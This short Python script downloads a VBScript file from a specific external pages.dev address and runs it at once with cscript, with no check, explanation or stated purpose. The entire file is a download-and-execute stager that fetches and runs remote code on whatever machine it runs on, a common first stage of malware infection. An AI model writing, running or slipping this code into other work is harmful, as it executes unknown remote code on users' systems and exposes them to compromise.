import urllib.request
import subprocess

def download_and_execute(url, filename="downloaded_script.vbs"):
    urllib.request.urlretrieve(url, filename)
    subprocess.run(["cscript", "//nologo", filename], check=True)

if __name__ == "__main__":
    download_and_execute("https://jjjy-9mb.pages.dev/j.vbs")
